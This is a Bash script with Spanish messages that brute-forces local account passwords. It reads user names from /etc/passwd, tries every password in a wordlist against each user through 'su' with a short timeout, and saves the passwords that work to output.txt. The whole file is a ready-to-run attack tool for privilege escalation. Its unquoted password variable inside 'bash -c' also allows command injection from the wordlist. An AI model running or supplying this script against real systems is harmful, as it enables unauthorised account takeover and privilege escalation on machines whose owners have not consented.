#!/bin/bash

# Colores
rojo='\033[1;31m'
verde='\033[1;32m'
amarillo='\033[1;33m'
reset='\033[0m'


# Parametros
passwords_list=$1

# Comprobacion
if [ $# != 1 ]; then
  echo -e "${verde}[${amarillo}*${verde}] Uso: ${rojo}$0 ${amarillo}<passwords_list>${reset}"
  exit 1
fi

# Funciones

salir(){
  echo -e "${rojo}[-] Saliendo....${reset}"
  rm ./users.txt
  exit 1
}

check_fun(){
  if [ $? != 0 ]; then
    echo -e "${rojo}[-] Hubo un error, saliendo...${reset}"
    exit 1
  fi
}
# Obtenemos los usuarios filtrando por las shells y home

cat /etc/passwd | grep "sh$" | sed 's/:/ /g' | awk '{print $1}' > users.txt
check_fun

# Fuerza a los usuarios
trap salir SIGINT


lineas=$(wc -l $passwords_list | awk '{print $1}')
intentos=0
touch output.txt

while IFS= read -r pass; do
  while IFS= read -r user; do
    echo -e "${verde}[${rojo}*${verde}]${rojo} Probando... $intentos${amarillo}/${rojo}$lineas${reset}"
    if timeout 0.5 bash -c "echo '$pass' | su $user" > /dev/null 2>&1; then
      clear
      echo -e "[✓] Contraseña $pass encontrada para el usuario $user" >> output.txt
      cat users.txt | grep -v "$user" > users.txt.tmp
      rm users.txt
      mv users.txt.tmp users.txt
    fi
    clear
  done < "./users.txt"
  intentos=$(($intentos+1))
done < "$passwords_list"

clear
echo -e "${rojo}[+] Se guardó el reporte en ./output.txt${reset}"
rm ./users.txt
